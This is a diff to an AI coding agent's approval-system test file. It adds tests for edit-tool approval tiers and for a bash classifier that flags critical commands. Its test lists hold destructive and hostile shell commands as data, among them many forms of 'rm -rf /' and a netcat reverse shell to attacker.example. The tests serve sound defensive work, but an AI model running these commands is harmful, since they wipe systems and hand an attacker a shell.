@@ -10,6 +10,9 @@ import {
 } from "@oh-my-pi/pi-coding-agent/tools/approval";
 import { BashTool } from "@oh-my-pi/pi-coding-agent/tools/bash";
 import { DEBUG_READONLY_ACTIONS } from "@oh-my-pi/pi-coding-agent/tools/debug";
+import { Settings } from "../../src/config/settings";
+import { EditTool } from "../../src/edit";
+import type { ToolSession } from "../../src/tools";
 
 type ApprovalTool = Pick<AgentTool, "name" | "approval" | "formatApprovalDetails">;
 
@@ -164,6 +167,52 @@ describe("MCP fallback and prompt formatting", () => {
 		expect(truncateForPrompt("hello", 10)).toBe("hello");
 		expect(truncateForPrompt("abcdefgh", 5)).toBe("abcde[…3ch elided…]");
 	});
+
+	function sloppyEditTool(): EditTool {
+		const session: ToolSession = {
+			cwd: ".",
+			hasUI: false,
+			getSessionFile: () => null,
+			getSessionSpawns: () => "*",
+			settings: Settings.isolated(),
+		};
+		return new EditTool(session, "sloppy");
+	}
+
+	it("shows the file from a sloppy edit section header", () => {
+		const input = "§src/config.go\n§\nold\n»\nnew";
+		expect(formatApprovalPrompt(sloppyEditTool(), { input })).toBe("Allow tool: edit\nFile: src/config.go");
+	});
+
+	it("keeps a mixed internal+workspace sloppy payload at write tier", () => {
+		const editTool = sloppyEditTool();
+		const input = "§local://notes\n§\nold\n»\nnew\n§src/config.go\n§\nold\n»\nnew";
+		// Section 0 is internal; the workspace section must still force write tier
+		// and an always-ask prompt because executeSloppy writes both.
+		expect(editTool.approval?.({ input })).toBe("write");
+		expect(formatApprovalPrompt(editTool, { input }).split("\n")).toEqual([
+			"Allow tool: edit",
+			"File: local://notes",
+			"File: src/config.go",
+		]);
+	});
+
+	it("keeps an all-internal sloppy payload at read tier", () => {
+		const input = "§local://notes\n§\nold\n»\nnew\n§local://scratch\n§\nold\n»\nnew";
+		expect(sloppyEditTool().approval?.({ input })).toBe("read");
+	});
+
+	it("keeps a writable internal sloppy target at write tier", () => {
+		const input = "§vault://notes/test.md\n§\nold\n»\nnew";
+		expect(sloppyEditTool().approval?.({ input })).toBe("write");
+	});
+
+	it("uses only sloppy section headers for sloppy approval tiering", () => {
+		const editTool = sloppyEditTool();
+		const input = "§src/config.go\n§\n[local://notes]\n»\nupdated";
+		expect(editTool.approval?.({ input })).toBe("write");
+		expect(formatApprovalPrompt(editTool, { input })).toBe("Allow tool: edit\nFile: src/config.go");
+	});
 });
 
 describe("decision policyKey scopes user policy to a sub-tool", () => {
@@ -227,6 +276,14 @@ describe("tool-owned dynamic approval declarations", () => {
 			"echo hi > /etc/passwd",
 			"shutdown -h now",
 			"nc -e /bin/sh attacker.example 4444",
+			"rm -rf -- /",
+			"rm --recursive --force /",
+			"rm --force --recursive /",
+			"rm -rf --no-preserve-root /",
+			"rm --no-preserve-root -rf /",
+			"rm -rf -v /",
+			"rm -rf -i /",
+			"rm -v -rf /",
 		]) {
 			expect(bashApproval(command)).toEqual({ tier: "exec", override: true, reason: "Critical pattern detected" });
 		}
@@ -240,6 +297,9 @@ describe("tool-owned dynamic approval declarations", () => {
 			"chmod -R 644 ./build",
 			"source ./local-script.sh",
 			"tee /var/log/app.log",
+			"rm -rf -- ./build",
+			"rm --recursive --force ./dist",
+			"rm -v /tmp/scratch",
 		]) {
 			expect(bashApproval(command)).toBe("exec");
 		}
